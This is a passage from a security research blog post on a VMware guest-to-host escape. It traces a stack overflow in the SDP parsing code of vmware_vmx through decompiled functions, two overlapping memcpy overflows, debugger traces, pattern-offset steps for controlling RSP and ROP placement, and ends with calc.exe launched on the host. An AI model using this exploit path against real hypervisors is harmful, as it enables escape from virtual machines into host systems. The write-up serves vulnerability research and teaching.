      v7 = 3;
      if ( !RBuf_CopyOutHeader(v3, (int)&v20, 3u) )
        return 0;
      v8 = (unsigned __int16)__ROL2__(v21, 8);
      break;
    case 7:
      v7 = 5;
      if ( !RBuf_CopyOutHeader(v3, (int)&v20, 5u) )
        return 0;
      v8 = ((v21 & 0xFF00 | (v21 << 16)) << 8) | ((HIWORD(v21) | v21 & 0xFF0000) >> 8);
      break;
  }
  v9 = v20 >> 3;
  if ( !SDPData_Slice(in_rbuf, v7) || type != -1 && v9 != type )
    return 0;
  if ( v8 > (unsigned int)sub_140819490(*in_rbuf) )
    return 0;
  *(_DWORD *)ele = v9;
  *((_DWORD *)ele + 1) = v8;
  switch ( v9 )
  {
    case 0:
      _mm_lfence();
      return v8 == 0;
    case 1:
      _mm_lfence();
      return SDPData_ReadRawInt(in_rbuf, v8, (_QWORD *)ele + 1, (_QWORD *)ele + 2);
    case 2:
      _mm_lfence();
      v11 = 8 * v8 - 1;
      if ( !SDPData_ReadRawInt(in_rbuf, v8, &v16, &v17) )
        return 0;
      v12 = v16;
      if ( v11 < 0x40 )
      {
        if ( v16 >> v11 )
        {
          v13 = -1;
          v12 = (-1LL << v11) | v16;
          goto LABEL_29;
        }
        goto LABEL_28;
      }
      if ( v11 >= 0x80 )
      {
LABEL_28:
        v13 = v17;
        goto LABEL_29;
      }
      v13 = v17;
      if ( v17 >> (8 * (unsigned __int8)v8 - 65) )
        v13 = (-1LL << (8 * (unsigned __int8)v8 - 65)) | v17;
LABEL_29:
      *((_QWORD *)ele + 1) = v12;
      if ( ele != (struct_a3 *)-16LL )
        *((_QWORD *)ele + 2) = v13;
      result = 1;
      break;
    case 3:
      if ( ((v8 - 2) & 0xFFFFFFFD) != 0 )
      {
        if ( v8 == 16 && RBuf_CopyOutHeader((_QWORD *)*in_rbuf, (_DWORD)ele + 8, 0x10u) )
          return SDPData_Slice(in_rbuf, 0x10u);
        return 0;
      }
      _mm_lfence();
      if ( !SDPData_ReadRawInt(in_rbuf, v8, &v18, 0) )
        return 0;
      v14 = v18;
      v15 = v18;
      *((_DWORD *)ele + 3) = 0x100000;
      *((_DWORD *)ele + 4) = -2147483520;
      *((_DWORD *)ele + 5) = -80438433;
      *((_DWORD *)ele + 2) = ((v14 & 0xFF00 | (v14 << 16)) << 8) | ((unsigned int)(HIWORD(v14) | v15 & 0xFF0000) >> 8);
      return 1;
    case 4:
    case 6:
    case 7:
    case 8:
      _mm_lfence();
      *((_QWORD *)ele + 1) = RBuf_CopyOutData((_QWORD **)in_rbuf, 0, v8);
      return 1;
    case 5:
      _mm_lfence();
      if ( !SDPData_ReadRawInt(in_rbuf, v8, &v19, 0) )
        return 0;
      *((_BYTE *)ele + 8) = v19 != 0;
      return 1;
    default:
      return 0;
  }
  return result;
}
```

This would be the entire Exploit code path once we are in **`proc_search_attr_req`**:
```c
__int64 __fastcall proc_search_attr_req(struct_a1_1 *a1, _QWORD *a2, __int64 **a3)
{
  __int64 v6; // rbp
  unsigned __int64 v8; // rax
  __int64 v9; // rcx
  void *v10; // rbx
  _QWORD *v11; // rdi
  unsigned int v12; // ebx
  unsigned int v13; // eax
  int v14; // eax
  unsigned int v15; // eax
  unsigned int v16; // esi
  _WORD *v17; // rbx
  int v18; // eax
  unsigned int v19; // [rsp+30h] [rbp-78h] BYREF
  _BYTE v20[8]; // [rsp+38h] [rbp-70h] BYREF
  __int64 v21; // [rsp+40h] [rbp-68h]
  _BYTE v22[8]; // [rsp+50h] [rbp-58h] BYREF
  __int64 v23; // [rsp+58h] [rbp-50h]
  unsigned __int64 v24; // [rsp+68h] [rbp-40h] BYREF

  v6 = *(_QWORD *)(*((_QWORD *)a1 + 4) + 24LL);
  if ( !SDPData_ReadElement(a2, 6, (struct_a3 *)v20) )
    return 3;
  if ( !SDPData_ReadRawInt(a2, 2u, &v24, 0) || !SDPData_ReadElement(a2, 6, (struct_a3 *)v22) )
  {
    sub_14083BBD0((__int64)v20);
    return 3;
  }
  if ( sdp_getdatasize(a2, &v19) )
  {
    v8 = v24;
    if ( v24 < 0x21 )
      v8 = 33;
    v9 = *((_QWORD *)a1 + 6);
    v24 = v8 - 32;
    v10 = (void *)sub_14083CAB0(v9, v6, v21, v23);
...
```

On **`sub_14083CAB0`**:
```c
__int64 __fastcall sub_14083CAB0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v8; // rbx
  int v10; // [rsp+30h] [rbp-39h] BYREF
  void *v11; // [rsp+38h] [rbp-31h] BYREF
  void *v12; // [rsp+40h] [rbp-29h] BYREF
  int v13; // [rsp+48h] [rbp-21h] BYREF
  __int128 v14; // [rsp+4Ch] [rbp-1Dh]
  int v15; // [rsp+5Ch] [rbp-Dh]
  void *v16; // [rsp+60h] [rbp-9h] BYREF
  __int64 v17; // [rsp+68h] [rbp-1h] BYREF
  _BYTE v18[8]; // [rsp+70h] [rbp+7h] BYREF
  _BYTE v19[16]; // [rsp+78h] [rbp+Fh] BYREF

  v11 = (void *)sub_1408192B0(a1);
  v12 = (void *)sub_140819170(a2);
  while ( SDPData_ReadElement(&v11, 6, (struct_a3 *)&v13) )
  {
    if ( (unsigned __int8)sub_14083BC10(*(_QWORD *)((char *)&v14 + 4), &v10) )
    {
      v8 = *(_QWORD *)((char *)&v14 + 4);
      v16 = (void *)sub_1408192B0(a3);
      while ( SDPData_ReadElement(&v16, 3, (struct_a3 *)v18) )
      {
        if ( !(unsigned __int8)sub_14083C600(v19, v8) )
        {
          unref_sdp(v16);
          goto LABEL_8;
        }
      }
      unref_sdp(v16);
      sub_14083D120((unsigned int)&v12, a2, 4, v10, 0);
    }
LABEL_8:
    if ( v13 == 4 || v13 == 6 || (unsigned int)(v13 - 7) <= 1 )
    {
      unref_sdp(*(void **)((char *)&v14 + 4));
      *(_QWORD *)((char *)&v14 + 4) = 0;
    }
  }
  unref_sdp(v11);
  v11 = v12;
  v17 = sub_140819170(a2);
  while ( SDPData_ReadRawInt(&v11, 4u, (unsigned __int64 *)&v12, 0) )
  {
    v13 = 6;
    v15 = 0;
    v14 = 0;
    *(_QWORD *)((char *)&v14 + 4) = sub_14083C710(a1, a2, (unsigned int)v12, a4);
...
```

On **`sub_14083C710`**:
```c
__int64 __fastcall sub_14083C710(__int64 a1, __int64 a2, int a3, __int64 a4)
{
  unsigned int v8; // edi
  char v9; // bl
  unsigned int v10; // edx
  unsigned int v11; // eax
  int v12; // [rsp+20h] [rbp-49h] BYREF
  void *v13; // [rsp+28h] [rbp-41h] BYREF
  void *v14; // [rsp+30h] [rbp-39h] BYREF
  __int64 v15; // [rsp+38h] [rbp-31h] BYREF
  int v16; // [rsp+40h] [rbp-29h] BYREF
  int v17; // [rsp+44h] [rbp-25h]
  void *v18; // [rsp+48h] [rbp-21h]
  int v19; // [rsp+58h] [rbp-11h] BYREF
  void *v20; // [rsp+60h] [rbp-9h]
  _BYTE v21[8]; // [rsp+70h] [rbp+7h] BYREF
  unsigned __int16 v22; // [rsp+78h] [rbp+Fh]

  v13 = (void *)sub_1408192B0(a1);
  if ( !SDPData_ReadElement(&v13, 6, (struct_a3 *)&v16) )
  {
LABEL_9:
    unref_sdp(v13);
    return 0;
  }
  while ( !(unsigned __int8)sub_14083BC10((__int64)v18, &v12) || v12 != a3 )
  {
    if ( v16 == 4 || v16 == 6 || (unsigned int)(v16 - 7) <= 1 )
    {
      unref_sdp(v18);
      v18 = 0;
    }
    if ( !SDPData_ReadElement(&v13, 6, (struct_a3 *)&v16) )
      goto LABEL_9;
  }
  unref_sdp(v13);
  v14 = v18;
  if ( !v18 )
    return 0;
  v15 = sub_140819170(a2);
  while ( SDPData_ReadElement(&v14, 1, (struct_a3 *)v21) )
  {
    v8 = v22;
    v13 = (void *)sub_1408192B0(a4);
    v9 = 0;
    do
    {
      if ( !SDPData_ReadElement(&v13, 1, (struct_a3 *)&v16) )
        break;
      if ( v17 == 2 )
      {
        v11 = (unsigned int)v18;
        v10 = (unsigned int)v18;
      }
      else
      {
        if ( v17 != 4 )
          break;
        v10 = WORD1(v18);
        v11 = (unsigned __int16)v18;
        if ( WORD1(v18) > (unsigned int)(unsigned __int16)v18 )
          break;
      }
      if ( v8 >= v10 && v8 <= v11 )
        v9 = 1;
    }
    while ( !v9 );
...
```

On **`SDPData_ReadElement(&v13, 1, (struct_a3 *)&v16)`** we achieve `case 6`
```c
...
    case 6:
      v7 = 3;
      if ( !RBuf_CopyOutHeader(v3, (int)&v20, 3u) )
        return 0;
...
```

```c
char __fastcall RBuf_CopyOutHeader(_QWORD *a1, int a2, unsigned __int64 a3)
{
  if ( ((*a1 >> 16) & 0xFFFFFFuLL) < a3 )
    return 0;
  sub_140818A70((_DWORD)a1, 0, a3, a2, 0, 0);
  return 1;
}
```

Until the first `memcpy`:
```c
unsigned __int64 __fastcall sub_140818A70(_QWORD *a1, unsigned int a2, unsigned int a3, char *a4, __int64 a5, int a6)
{
  _QWORD *v6; // rbx
  _QWORD *v7; // rcx
  int v11; // r14d
  unsigned __int64 v12; // r10
  __int64 v13; // rcx
  unsigned __int64 result; // rax
  _QWORD *v15; // rcx
  unsigned int v16; // esi
  unsigned int v17; // eax
  __int64 v18; // rdx

  v6 = a1;
  v7 = (_QWORD *)a1[1];
  if ( v7 )
  {
    v11 = a6 + 1;
    while ( 1 )
    {
      v12 = (unsigned int)(*v6 >> 40) + a2;
      v13 = *v7 >> 16;
      result = v13 & 0xFFFFFF;
      if ( v12 >= result )
      {
        v16 = 0;
        a2 = v12 - (v13 & 0xFFFFFF);
      }
      else
      {
        _mm_lfence();
        v15 = (_QWORD *)v6[1];
        v16 = ((*v15 >> 16) & 0xFFFFFF) - v12;
        if ( a3 < ((*v15 >> 16) & 0xFFFFFFLL) - v12 )
          v16 = a3;
        result = sub_140818A70((int)v15, v12, v16, (int)a4, a5, v11);
        a2 = 0;
      }
      v6 = (_QWORD *)v6[2];
      if ( !v6 )
        break;
      a3 -= v16;
      if ( !a3 )
        break;
      if ( a4 )
        a4 += v16;
      v7 = (_QWORD *)v6[1];
      ++v11;
      if ( !v7 )
        goto LABEL_13;
    }
  }
  else
  {
LABEL_13:
    if ( a4 )
    {
      return (unsigned __int64)memcpy(a4, (char *)v6 + a2 + 24, a3);
...
```

The second and final `memcpy` is executed in **`SDPData_ReadRawInt`**:
```c
char __fastcall SDPData_ReadRawInt(_QWORD *a1, unsigned int len, unsigned __int64 *a3, unsigned __int64 *a4)
{
  size_t v4; // rdi
  char result; // al
  unsigned __int64 v9; // [rsp+20h] [rbp-58h]
  unsigned __int64 v10; // [rsp+28h] [rbp-50h]
  _BYTE Src[16]; // [rsp+30h] [rbp-48h] BYREF

  v4 = len;
  result = RBuf_CopyOutHeader((_QWORD *)*a1, (int)Src, len);
  if ( result )
  {
    memcpy(&Src[-v4], Src, v4);
    *a3 = ((unsigned int)(HIWORD(v10) | HIDWORD(v10) & 0xFF0000) >> 8)
        | (((HIDWORD(v10) << 16) | WORD2(v10) & 0xFF00u) << 8)
        | (((unsigned int)v10 & 0xFF000000
          | ((v10 & 0xFF0000 | ((unsigned __int64)(((unsigned int)(v10 & 0xFF00) | ((_DWORD)v10 << 16)) << 8) << 8)) << 16)) << 8);
    if ( a4 )
      *a4 = ((unsigned int)(HIWORD(v9) | HIDWORD(v9) & 0xFF0000) >> 8)
          | ((WORD2(v9) & 0xFF00u | (HIDWORD(v9) << 16)) << 8)
          | (((unsigned int)v9 & 0xFF000000
            | ((v9 & 0xFF0000 | ((unsigned __int64)(((unsigned int)(v9 & 0xFF00) | ((_DWORD)v9 << 16)) << 8) << 8)) << 16)) << 8);
    return SDPData_Slice(a1, v4);
  }
  return result;
}
```

Step 1: **``sub_140818A70``** writes 0x28f bytes starting at ``RSP+0x30``
        ``RSP+0x30`` through ``RSP+0x2BF`` is filled with our data
        That's way past the stack frame boundary
        Return addresses are overwritten -> FIRST OVERFLOW

Step 2: ``memcpy``(``RSP+0x30`` - 0x28f, ``RSP+0x30``, 0x28f)
        = memcpy(``RSP-0x25F``, ``RSP+0x30``, 0x28f)
        Copies data even FURTHER DOWN the stack
        Overwrites even more return addresses below -> SECOND OVERFLOW
        
memcpy returns -> pops corrupted return address.

![](imgs/blog/11VmwareGuestToHost/20260329211317.png)

![](imgs/blog/11VmwareGuestToHost/20260329211405.png)

This is the stack trace:
```bash
0:000> k
 # Child-SP          RetAddr               Call Site
00 000000a5`ed2fed80 00007ff6`db2ec850     vmware_vmx+0x83c1d2
01 000000a5`ed2fee10 00007ff6`db2ecc65     vmware_vmx+0x83c850
02 000000a5`ed2feee0 00007ff6`db31c1bc     vmware_vmx+0x83cc65
03 000000a5`ed2fefb0 00007ff6`db31bce6     vmware_vmx+0x86c1bc
04 000000a5`ed2ff060 00007ff6`db2f1e4e     vmware_vmx+0x86bce6
05 000000a5`ed2ff0c0 00007ff6`db1ce729     vmware_vmx+0x841e4e
06 000000a5`ed2ff100 00007ff6`db2f2993     vmware_vmx+0x71e729
07 000000a5`ed2ff140 00007ff6`db2cc36d     vmware_vmx+0x842993
08 000000a5`ed2ff1c0 00007ff6`db2f35e5     vmware_vmx+0x81c36d
09 000000a5`ed2ff320 00007ff6`db2ca21e     vmware_vmx+0x8435e5
0a 000000a5`ed2ff370 00007ff6`db200116     vmware_vmx+0x81a21e
0b 000000a5`ed2ff510 00007ff6`db20285a     vmware_vmx+0x750116
0c 000000a5`ed2ff6a0 00007ff6`db1574a6     vmware_vmx+0x75285a
0d 000000a5`ed2ff830 00007ff6`db1bc625     vmware_vmx+0x6a74a6
0e 000000a5`ed2ff870 00007ff6`dab5029c     vmware_vmx+0x70c625
0f 000000a5`ed2ff8c0 00007ff6`dab50691     vmware_vmx+0xa029c
10 000000a5`ed2ff910 00007ff6`dab5004b     vmware_vmx+0xa0691
11 000000a5`ed2ff980 00007ff6`dab4eee6     vmware_vmx+0xa004b
12 000000a5`ed2ffa00 00007ff6`db0b384b     vmware_vmx+0x9eee6
13 000000a5`ed2ffa50 00007ff6`dab43656     vmware_vmx+0x60384b
14 000000a5`ed2ffa90 00007ff6`dab42381     vmware_vmx+0x93656
15 000000a5`ed2ffb00 00007ff6`dab42cfb     vmware_vmx+0x92381
16 000000a5`ed2ffb60 00007ff6`daac79d2     vmware_vmx+0x92cfb
17 000000a5`ed2ffbb0 00007ffd`cdace8d7     vmware_vmx+0x179d2
18 000000a5`ed2ffbf0 00007ffd`cf38c48c     KERNEL32!BaseThreadInitThunk+0x17
19 000000a5`ed2ffc20 00000000`00000000     ntdll!RtlUserThreadStart+0x2c
```

![](imgs/blog/11VmwareGuestToHost/20260329215509.png)

![](imgs/blog/11VmwareGuestToHost/20260329220157.png)

```bash
0:000> g
[memcpy] dst=0x000000e222efeb31 src=0x000002a6167c6258 size=0x1
[memcpy] dst=0x000000e222efea60 src=0x000002a616a9116b size=0x1
...
...
[memcpy] dst=0x000000e222efe9d0 src=0x000002a600847420 size=0x28f
```

## Exploitation
We can replace the `0x41` buffer with a unique pattern from `msf-pattern_create`.

We can conclude that RSP points to the offset 599 under our shellcode and we have a usable size of 655

```
msf-pattern_create -l 655
```

After the crash, RSP pointed to the pattern `4131754130754139`. Using `msf-pattern_offset`:

```
msf-pattern_offset -q 4131754130754139
-> 599
```

This means RSP points to **byte 599** out of 655 in the buffer at crash time. The first ROP gadget must be placed at position 599. After that we are completely free of doing our ROP chain

In my case, I don't want to make the blog too long, and since this is more about exploitation rather than research (I plan to write blogs more focused on exploitation), I simply executed the calculator (`calc.exe`) from the guest to the host:

![](imgs/blog/11VmwareGuestToHost/20260404230650.png)

I should also point out that I don't consider this particularly noteworthy, since everything is already explained magnificently by Alexander Zaviyalov, so I don't want to be redundant. That said, more blogs related to exploitation are coming.

## Conclusion
This was the Guest-to-Host (one of them) in VMware. It was a very fun and engaging process, both the exploitation itself and understanding the exploit, as well as working with the internals of the protocols.

Good morning, and in case I don't see ya: Good afternoon, good evening, and good night!
